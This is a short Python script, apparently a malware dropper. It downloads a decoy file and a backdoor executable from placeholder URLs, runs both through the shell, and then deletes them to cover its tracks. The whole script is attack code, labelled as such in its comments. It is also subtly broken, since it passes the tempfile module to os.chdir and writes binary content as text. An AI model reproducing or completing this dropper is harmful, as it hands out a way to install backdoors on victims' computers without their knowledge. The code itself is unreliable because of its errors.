# Imports
import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]

    with open(file_name, "w") as out_file:
        out_file.write(str(get_response.content))


# Moving to Temp Directory
temp_directory = tempfile.gettempdir()
os.chdir(tempfile)

# Downloading and Executing the Malware
download("URL-to-Download-Front-File")
subprocess.Popen("downloadedFile", shell=True)

# Downloading and Executing the Malware
download("URL-to-Download-Backdoor")
subprocess.call("backdoor.exe", shell=True)

# Deleting the Downloaded File
os.remove("downloadedFile")
os.remove("backdoor.exe")
